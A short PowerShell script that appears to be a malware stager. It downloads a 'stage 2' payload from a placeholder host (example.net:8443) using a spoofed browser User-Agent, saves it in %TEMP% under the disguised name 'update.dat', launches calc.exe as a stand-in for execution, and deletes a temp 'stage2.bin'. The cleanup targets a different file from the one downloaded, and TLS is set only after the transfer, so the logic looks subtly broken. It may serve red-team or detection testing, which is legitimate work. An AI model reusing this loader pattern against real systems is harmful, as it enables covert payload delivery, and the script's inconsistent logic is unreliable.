[CmdletBinding()]
param(
    [string]$Stage2Url = "https://example.net:8443/updater.ps1",
    [string]$PayloadPath = "$env:TEMP\update.dat",
    [int]$StageTimeout = 214,
    [string]$RequestAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
)
$ErrorActionPreference = "Stop"

function Invoke-PayloadFetch {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45,
        [string]$UserAgent = "Mozilla/5.0"
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$TransferResult = Invoke-PayloadFetch -SourceUrl $Stage2Url -DestinationPath $PayloadPath -TimeoutSec $StageTimeout -UserAgent $RequestAgent
if ($TransferResult) {
    Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
}

Remove-Item -Path "$env:TEMP\stage2.bin" -Force
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
